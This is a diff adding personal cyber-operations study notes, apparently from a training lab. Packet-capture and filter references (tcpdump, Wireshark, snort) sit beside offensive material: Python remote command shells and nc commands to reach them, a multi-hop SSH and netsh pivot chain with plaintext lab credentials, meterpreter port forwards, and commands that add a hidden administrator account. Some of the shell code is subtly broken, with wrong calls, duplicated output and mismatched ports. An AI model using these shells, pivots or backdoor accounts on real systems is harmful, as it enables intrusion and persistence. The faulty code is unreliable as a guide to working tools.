+			client.close()
+			fd.close()
+
+		}}} #
+		{{{ #TCP Reverse Shell
+		- On Target (192.168.11.11)
+			#!/usr/bin/python
+			from socket import *
+			import subprocess
+			server = socket(AF_INET, SOCK_STREAM)
+			server.bind(("0.0.0.0", 3232))
+			server.listen(10)
+			client, address = server.accept()
+			command = client.recv(1024)
+			while command.rstrip('\n') != "quit":
+				shellproc = subprocess.popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+				output=shellproc.stdout.read()
+				client.send(output)
+				errmsg=shellproc.stderr.read()
+				client.send(errmsg)
+				shellproc.kill()
+				command = client.recv(1024)
+			client.close()
+			server.close()
+
+		- On Op Box 
+			$ nc 192.168.11.11 3232
+			
+		}}} #
+		{{{ #UDP Shell
+		- On Target (192.168.11.11)
+			#!/usr/bin/python
+			from socket import *
+			import subprocess
+			server = socket(AF_INET, SOCK_DGRAM)
+			server.bind(("0.0.0.0", 21))
+			command,address = server.recvfrom(1024)
+			while command.rstrip('\n') != "quit":
+				shellproc = subprocess.popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+				output=shellproc.stdout.read()
+				server.sendto(output, (address[0], 53))
+				errmsg=shellproc.stderr.read()
+				server.sendto(output, (address[0], 53))
+				shellproc.kill()
+				command,address = server.recvfrom(1024)
+			server.close()
+
+		- On Opstation
+			$ nc -u 192.168.11.11 32320		
+
+			#!/usr/bin/python
+			from socket import *
+			client = socket(AF_INET,SOCK_DGRAM)
+			client.bind(("0.0.0.0",53))
+			while True:
+				r = client.recv(5120)
+				print r
+			client.close()
+
+		}}} #
+
+	}}} #
+	{{{ #Ping Socket (test socket connectivity)
+	- https://www.kite.com/python/answers/how-to-check-if-a-network-port-is-open-in-python
+	```O
+	import socket 
+	a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	a_socket.connect_ex(("1.1.1.1",23))
+	#Response "0" = Port is Open
+	```C
+	
+	}}}
+	
+}}} #
+{{{ #snoop (tcpdump for Solaris)
+	- arp 
+		$ snoop -i eth0 'arp'
+	- ICMP to a single Machine
+		$ sudo snoop -r -d e1000g1 host 192.168.1.4 icmp 
+
+}}} #
+{{{ #snort	
+	- Important Files 
+		- /etc/snort/snort.conf 
+			- To Include a Rule 
+				$ include $RULE_PATH/{name}/rules 
+		- /etc/snort/rules/*.rules
+	- Writing Rules 
+		- Action 
+			> Alert: Generates an alert using a system-wide defined method
+			> Log: Logs the packet, but otherwise takes no action
+			> Pass: Nothing
+		- @(Network|Transport) layer information 	(can use ! (not) operator)
+			> Protocol: 		OPTIONS: TCP, UDP, ICMP, IP 
+			> Source IP: 		OPTIONS: host IP, network IP with CIDR, "any", $EXTERNAL_NET, $INTERNAL_NET, $SOMEOTHER_VARIABLE 
+			> Source Port:		OPTIONS: Single Port Number, Port Range (20:389), "any"
+			> Direction: 		OPTIONS: "->":One-Way, "<>":bi-direction
+			> Destination IP:	OPTIONS: host IP, network IP with CIDR, "any", $EXTERNAL_NET, $INTERNAL_NET, $SOMEOTHER_VARIABLE 
+			> Destination Port:	OPTIONS: Single Port Number, Port Range (20:389), "any"
+		- Rule Options
+			- Non-Payload Characheristics
+				> Flags: matches TCP flags
+				> Flow: established vs new connections
+				> TTL: time-to-live of the packet
+			- Payload Charachteristics
+				> Content:
+					$ content:"known sting here"	#String Matching
+					$ content:"|00 45 ab dc ef|"	#Binary Matching
+				> Depth: Limits how far into a packet to look for a Content String 
+				> HTTP elements: limit the content matcher to specific HTTP message segments (http_client_body, http_cookie)
+
+}}} #
+{{{ #tc
+	- Get Config 
+		$ tc qdisc
+	- Slow down a NIC.
+		$ tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 50ms
+
+}}} #
+{{{ #tcpdump
+	{{{ #Arguments
+		- Notes:
+			- If you use 'host 1.1.1.1' instead of 'ip host 1.1.1.1' You will also get arp and rarp trafficip
+		arg | def
+		--- | ---
+		-e	| link level header on each dump line
+		-n	| don't resolve addresses
+		-c	| exit after x number of collected frames
+		-v	| verbose
+		-i	| specify interface
+		-D	| list available interfaces
+		-w	| write output to a file
+		-r	| read input from a file
+		-x	| raw packets (rather than parse and print)
+		-X 	| NOT including link layer
+		-XX	| prints the entire contents of a captured frame in both hex and ASCII. (including link layer)
+		-s 0 | capture ENTIRE contets of recieved frames
+		-s 5 | capture first 5 bytes of recieved frames **?**
+		-d 	| show compiled version of the filter (assebly)
+
+		Syntax								| Definition
+		---									| --- 
+		ether host aa:bb:cc:dd:ee:ff		| If either dest or src mac is aa:bb:cc:dd:ee:ff
+		ether src aa:bb:cc:dd:ee:ff			| If source is aa:bb:cc:dd:ee:ff
+		ether dst aa:bb:cc:dd:ee:ff			| If dest is aa:bb:cc:dd:ee:ff
+		ether multicast						| If dest is a multicast address
+		ether broadcast						| If dest is a broadcast address
+											| 
+		ip host 192.168.11.5				| If src or dst is that IP
+		ip dst 192.168.11.5					| If dst is that IP
+		ip src 192.168.11.5					| If src is that IP
+		ip net 10.0.0.0/27					| Captures all to and from traffic within that network **Only Works with newer syntax (old binaries are classful**
+		ip[19] & 0xc0 = 64					| Example of how to use a bitwise operand to specify a /26	
+	
+	}}} #
+	{{{ #General Structure
+		- From Pcap
+			$ tcpdump -tenner example.pcap 'ether src host 00:11:22:33:44:55 and ether [12:2]=0x0806'	
+		- Live
+			$ tcpdump -ennvvv -s0 -i eth0 udp port 68
+	
+	}}} #
+	{{{ #Layer 2
+		{{{ #Get arp Traffic
+			$ tcpdump -r yeet.pcap arp
+		
+		}}} #
+		{{{ #Get BPF Cisco Discovery Protocol (CCDP) pid
+			$ tcpdump -tvvvnr example.pcap 'ether[20:2]=0x2000'
+		
+		}}} #	
+		{{{ #Get gateway Mac 
+			$ tcpdump -c 1 -tennr example.pcap 'src host 192.168.1.2 and not dst net 192.168.1.0/24'
+		
+		}}} #
+		{{{ #Get IP of Mac
+			$ tcpdump -tenner example.pcap 'ether src host 00:11:22:33:44:55 and ether [12:2]=0x0806'
+		
+		}}} #
+		{{{ #Get Vlan 20
+			$ ether[12:2] = 0x8100 and ether[14] & 0x0f = 0 and ether[15] = 20
+				- ether[12:2] =0x8100 						to verify the ethertype is 802.1q
+				- ether[14] & 0x0f = 0 and ether[15] = 20	VLAN ID uses 12 bits total, you need to verify the last 4 of 14 are zero and the 8 bits of offset 15 make the binary value 20 
+		
+		}}} #
+		
+	}}} #
+	{{{ #Layer 3
+		{{{ #Get All fragments of Fragmented packets
+			$ ip[6:2] & 0x3FFF != 0
+			$ ip[6] & 0x60 = 0x40 and ip[6:2] & 0x1fff != 0
+		
+		}}} #	
+		{{{ #Get DHCP Trafic to and from host
+			$ tcpdump -ennvvv -s0 -i eth0 udp port 68
+		
+		}}} #
+		{{{ #Get TTL
+			$ ip[8] <= 64
+		
+		}}} #
+		
+	}}} #
+	{{{ #Layer 4
+		{{{ #Get protocol
+			$ tcpdump -i tun0 icmp
+			$ tcpdump -r example.pcap -n -S tcp src port 80 or 443
+			$ tcpdump -r example.pcap arp
+		
+		}}} #
+		{{{ #Get TCP is a syn not SYN ACK
+			$ tcp[13] & 0x12 = 0x02    (See TCP_UDP.md flags section)
+		
+		}}} #
+		{{{ #Get TCP window size
+			$ tcp[14:2] = 32768
+				#This may need to be added to to verify that the size is not zero. If it is, this could load the wrong byte.
+		
+		}}} #
+		
+	}}} #
+	{{{ #Fun Facts
+		- BPF can only extract 1, 2 or 4 bytes at a time
+		- snort is not a "common" sniffer (because it is an IDS maybe?)
+		- sniffers sit behind the nic and in front of everything else
+
+		{{{ #Bitwise/Bitmask operations
+			- The Bitmask defines the range you are concerned about EXAMPLE: If you are concerend with the second and fourth least significant bit, your mask would be 00001010 or 0x0a.
+			- Once you have your bitmask define the value you want it to be. If you want the second least significant off and the 4th least significant on it would be 00001000 or 0x08
+			- put it together and you have     
+			$ ether[25] & 0x0a = 0x08      #:25 is just an example here
+
+			10101010
+			00000001 &
+			--------
+			00000000        <<Only hits if both have a 1
+
+
+			10101011
+			00000001 &
+			--------
+			00000001
+
+
+			0x0800 & 0x0f00 = 0x08
+			[ Bitwise Calculator](https://miniwebtool.com/bitwise-calculator/?data_type=16&number1=0x0800&number2=0x0f00&operator=AND)
+
+		}}} #	
+		{{{ #Compiled Filters
+			- register definitions
+				- ld  (load 4 bytes)
+					- Loads a full word (4 bytes, regardless of system architecture) into the default register, usually called the A register. 
+					- The argument is the offset (in bytes, zero-based) from the beginning of the frame.
+					- EXAMPLE: ld [0] loads the first four bytes of the frame into the A register.
+				- ldh (load 2 bytes)
+					- Like ld, but loads half of a word (2 bytes, often called a SHORT integer) into the A register.
+					- EXAMPLE: ldh [12] loads bytes 12 and 13 of the frame into the default register
+				- ldb (load a byte)
+					- Like ld, but loads a single byte into the default register.
+					- EXAMPLE: ldb [14] loads bytes 14 into the A register
+				- jeq (boolean)
+					- This instruction is best explained with an example, such as jeq #0x800 jt 2 jf 3. This example compares the value in the A register to 0x0800; if the comparison is true, it will go to line 2 and continue executing; if the comparison is false, it will go to line 3 and continue executing
+				- jset (boolean with bitwise operand)
+					- Like jeq but it calculates the bitwise “&” of the first argument and the value in the A register, and goes to the jt line number if the result is non-zero; otherwise it goes to the jf line number.
+					ret (return)
+					- Quit and return a value.
+					- The value returned is the number of bytes of the frame specified by the argument.
+					- Frame is collected if the return value is not zero
+
+		}}} #
+				
+	}}} #
+
+}}} #
+{{{ #tshark
+	- identical to tcpdump as far as I can tell... **?**
+	$ c:\Program Files\Wireshark\wireshark.exe C:\temp\filetoopen.pcap
+
+	arg	| def
+	--- | ---
+	-i 	| specify interface
+	-D 	| list available interfaces
+	-w 	| write output to a file
+	-r 	| read input from a file
+
+}}} #
+{{{ #Wireshark
+	{{{ #Layer 2
+		- Get arp Traffic
+			$ arp 
+		- Get Gateway mac address
+			$ ip.src=192.168.1.2 && !(ip.dst == 192.168.1.0/24)		#rc is my ip ad the dst is not in my network
+		- Get CDP packets
+			$ llc.cisco_pid == 0x2000					#Also good for finding device information	
+		- Map mac to ip
+			$ ethr.src=00:11:22:33:44:55 && eth.type== 0x0806		#0x0806 specifies arp	
+		- Frame Hex Filtering
+			- First Byte = 0xff
+				$ eth[0] == 0xff
+			- 12th and 13th byte = 0x0806
+				$ eth[12:2] == 08:06
+			- First 6 Bytes are ff:ff:ff:ff:ff:ff
+				$ eth[0:6] == ff:ff:ff:ff:ff:ff	
+	
+	}}} #
+	{{{ #Layer 3
+		- Get from host
+			$ host 192.168.11.213	
+		- Packet dropped because TTL got to zero
+			$ ip.ttl.too_small
+			$ icmp.type==11
+		{{{ #DHCP
+			$ bootp
+		
+		}}} #
+		
+	}}} #
+	{{{ #Layer 4
+		- Get web traffic
+			$ tcp.srcport == 80 or tcp.srcport == 443	
+	
+	}}} #
+
+	{{{ #Fun Facts
+		- When conducting packet capture, Wireshark uses BPF syntax to define filters, but not when filtering a display. 
+		- When doing byte based filters, there are two core differences: the Ethernet header is designated as eth instead of ether, and the equality comparison operator is ==, not =.
+		- In a Wireshark display, you can also make multi-byte comparisons, but there are some small differences.
+			- unlike BPF, you are not restricted to picking two or four bytes
+			- Wireshark separates hex bytes with colons (:) when entering values; for example, if you would write 0x01020304 in BPF, the Wireshark display analog would be 01:02:03:04
+
+	}}} #
+
+}}} #
+
+}}} ###
+{{{ ###Tunneling/Redirection
+{{{ #BOC Operation Example
+>T1: 10.50.31.111   EXT_RTR     Linux       SSH in. Vet. Redir T2.
+    ->T2: 10.20.169.122     STORAGE1    Windows     SSH in. Vet. Redir T3.
+        -->T3: 10.20.169.238    Vyos1   Linux   SSH in. Vet. Redir T4.
+            ---> T4: 192.168.169.43     ADMIN1      Linux       SSh in. Vet. Ask Analys/MC If they want Survey. Collect FOI. Redir T5, T7.
+                ----< T5: 192.168.169.111   UNK     Windows     Tell analyst you are ready to Catch. Catch NC shell. Vet. Collect FOI. netsh to T6.
+                    -----> T6: 192.168.169.122      Unk     Linux       SSH in. Vet. Survey. Get user accounts. record login data?. BURNOFF. Kill NetSH rule. Burnoff T5.
+                ----> T7: 192.168.169.113   Unk     Windows     SSH in. Vet. Survey. Get User Accounts. record login data? Confrim T10 effect. Maybe do T10 Effect. BurnOff.
+
+
+10.50.31.111
+10.20.169.122
+10.20.169.238
+192.168.169.43
+192.168.169.111
+192.168.169.122
+192.168.169.113
+
+
+ssh -M -S /tmp/t1 -p 10123 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer14@10.50.31.111 -L10200:10.20.169.122:52203
+engineer14::enshallah
+
+
+ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson14@127.0.0.1 -L10300:10.20.169.238:52230
+caisson14::tread_depth
+
+
+ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin14@127.0.0.1 -L10400:192.168.169.43:33125
+NOC_Admin14::5gftE8DCc8
+
+
+ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user14@127.0.0.1 -L10700:192.168.169.113:33521  -L:10601:192.168.169.111:60014
+user14::P455w0rd 
+ssh -S /tmp/t4 dummy@127.0.0.1 -O forward -R8014:127.0.0.1:10500
+ssh -S /tmp/t4 dummy@127.0.0.1 -O cancel -R8014:127.0.0.1:10500
+ssh -S /tmp/t4 dummy@127.0.0.1 -O forward -R192.168.169.43:8014:127.0.0.1:10500
+ssh -S /tmp/t4 dummy@127.0.0.1 -O cancel -R192.168.169.43:127.0.0.1:10500
+
+
+nc -nlv 127.0.0.1 -p 10500
+netsh interface portproxy show all
+netsh interface portproxy set v4tov4 listenport=60014 listenaddress=192.168.169.111 connectaddress=192.168.169.122 connectport=33521 protocol=tcp
+netstat -nato | findstr 60014
+netsh interface portproxy delete v4tov4 listenport=60014 listenaddress=192.168.169.111 protocol=TCP
+
+
+ssh -M -S /tmp/t6 -p 10601 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user14@127.0.0.1
+user14::P455w0rd
+
+
+ssh -M -S /tmp/t7 -p 10700 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user14@127.0.0.1
+user14::P455w0rd
+
+net user user43 /add Y33TCann0n!!! 
+net localgroup administrators /add user43 
+
+
+
+engineer14::enshallah
+caisson14::tread_depth
+NOC_Admin14::5gftE8DCc8
+user14::P455w0rd
+
+}}} #
+{{{ #fpipe (windows)
+	- Generic Syntax
+		$ fpipe -l 8080 -r 80 1.1.1.1 	#Forward connections to localhost on 8080 to 80 on 1.1.1.1
+		
+}}} #
+{{{ #msf/meterpreter
+	Get					| Command
+	---					| ---
+	Resolve Hostname	| $ resolve TheYeetCannon TheOtherYeetCannon
+	SMB					| $ run multicommand -cl 'nbtstat -A 192.168.1.2'
+	Firewall Rules		| $ run multicommand -cl 'netsh advfirewall firewall show rule name=all'
+	Add Firewall Rules	| $ run multicommand -cl 'netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389'
+	ROUTE 				| #
+	Add route			| $ route add 192.168.106.50/32 5		#5=session Number
+	Remove route		| $ route remove 192.168.106.50/32 5
+	PORTFWD				| #
+	Forward 			| $ portfwd add -L 127.0.0.1 -l 3232 -r 1.1.1.1	-p 3233#-L=msflocalhost -l=in -p=dstport -r=remotehost 
+	Reverse Forward		| $ portfwd add -R -L 1.1.1.2 -l 3233 -p 3232			#-R=Indicates Reverse -L=FWDIP -l=FWDPort -p=LISTPort
+
+}}} #
+{{{ #SSH
+	- Notes:
+		- You will only use Reverse if something is beaconing out of the target and you want to catch it.  
+	
+	- Socket Syntax (Forward)
+		$ ssh -M -S /tmp/t1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bob@40.0.0.101  
+		$ ssh -S /tmp/t1 dummy@127.0.0.1 (dummy@127.0.0.1 is just a placeholder. does nothing)  
+		
+		$ scp -o ControlPath=/tmp/t1 dummy@127.0.0.1:/home/bob/room/lp.py /root/Desktop/  
+  
+		$ ssh -S /tmp/t1 dummy@127.0.0.1 -O forward -R5157:127.0.0.1:4444  
+		$ ssh -S /tmp/t1 dummy@127.0.0.1 -O cancel -R5157:127.0.0.1:4444  
+  
+	- Dynamic Forward
+		$ ssh -p 22 squid@192.168.21.122 -D 127.0.0.1:9050  
+		
+	- In-Terminal Forward 
+		$ [ENTER]
+		$ ~C 
+		$ -L127.0.0.1:32060:192.168.1.4:22
+		$ -KL127.0.0.1:32060
+
+}}} #
+{{{ #IPTables
+	{{{ #BOC Multi Hop Forward Example 
+		
+		kali:10.50.21.220
+		>T1: 10.50.30.20 / 192.168.0.99
+		-> T2: 192.168.0.10
+		--> T3: 192.168.0.23
+		---> T4: 192.168.0.13
+
+		T1: ssh -M -S /tmp/t1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -p 22
+		iptables -t nat -A PREROUTING -p tcp --dport 10200 -j DNAT --to-destination 192.168.0.10:22
+		iptables -t nat -A PREROUTING -p tcp --dport 10300 -j DNAT --to-destination 192.168.0.10:10300
+		iptables -t nat -A PREROUTING -p tcp --dport 10400 -j DNAT --to-destination 192.168.0.10:10400
+
+		iptables -t nat -A POSTROUTING -s 10.50.21.220 -p tcp -j SNAT --to-source 192.168.0.99
+
+
+		T2: ssh -M -S /tmp/t2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -p 10200
+		iptables -t nat -A PREROUTING -p tcp --dport 10300 -j DNAT --to-destination 192.168.0.23:22
+		iptables -t nat -A PREROUTING -p tcp --dport 10400 -j DNAT --to-destination 192.168.0.13:10400
+
+		iptables -t nat -A POSTROUTING -s 192.168.0.99 -p tcp -j SNAT --to-source 192.168.0.10
+
+
+		T3:  ssh -M -S /tmp/t3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -p 10300
+		iptables -t nat -A PREROUTING -p tcp --dport 10400 -j DNAT --to-destination 192.168.0.13:22
+
+		iptables -t nat -A POSTROUTING -s 192.168.0.10 -p tcp -j SNAT --to-source 192.168.0.23
+
+
+		T4: ssh -M -S /tmp/t4 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -p 10400
+
+	}}} #
+	{{{ #Simple Forward 
+		- 1.1.1.1	= Jump Point
+		- 2.2.2.2 	= IPTables host 
+		- 3.3.3.3	= Target 
+		$ iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
+		$ iptables -A FORWARD -p tcp --dport 22 -d 3.3.3.3 -s 1.1.1.1 -j ACCEPT
+		$ sudo iptables -t nat -A PREROUTING -p tcp -s 1.1.1.1 --dport 32061 -j DNAT --to-destination 3.3.3.3:22
+		$ sudo iptables -t nat -A POSTROUTING -p tcp --dport 22 -s 1.1.1.1 -j SNAT --to-source 2.2.2.2
+
+	}}} #
+	{{{ #TroubleShooting
+		- Kernel Forwarding 
+			$ sysctl net.ipv4.ip_forward						#Check 
+			$ sysctl -w net.ipv4.ip_forward=1					#Enable
+		- Kernel Modules
+			$ lsmod | grep conntrack							#Check 
+			$ insmod `find /sys -name ip_conntrack | head -n 1` #Enable
+	
+	}}} #
+	
+}}} #
+{{{ #netsh
+	- Notes
+		- Must be admin to use netsh
+	
+	- PortProxy
+		- Get current port proxies
+			$ netsh interface portproxy show all
+		- Create a portproxy (To expose internal port)
+			$ netsh interface portproxy set v4tov4 listenport=3232 connectaddress=github.com connectport=443 protocol=tcp
+		- Verify portproxy is listening
+			$ netstat -napo tcp | findstr 3232
+		- Get portproxy in reg
+			$ reg query hklm\system\currentcontrolset\services\portproxy /s
+		- Delete a portproxy
+			$ netsh interface portproxy delete v4tov4 listenport=3232 protocol=tcp
+			$ netsh interface portproxy delete v4tov4 listenport=10500 listenaddress=192.168.0.9 protocol=TCP
+	
+	- Allow Through Firewall 
+		$ runas /user:Administrator "netsh advfirewall firewall add rule name=32061 dir=in action=allow protocol=TCP localport=32061"
+
+}}} #
+{{{ #socat (Unix)
+	- Generic Forward 
+		$ socat TCP-LISTEN:8080,fork TCP-CONNECT:1.1.1.1:80
+	- UDP Forward Through TCP tunnel (SSH)
+		- Opstation 
+			$ ssh -p 22 user@1.1.1.1 -L0.0.0.0:32051:127.0.0.1:32051
+			$ socat UDP-LISTEN:137 TCP-CONNECT:127.0.0.1:32051
+		- Redirector (1.1.1.1)
+			$ socat TCP-LISTEN:32051 UDP-CONNECT:2.2.2.2:137
+		
+}}} #
+
+}}} ###
+
+
+
+
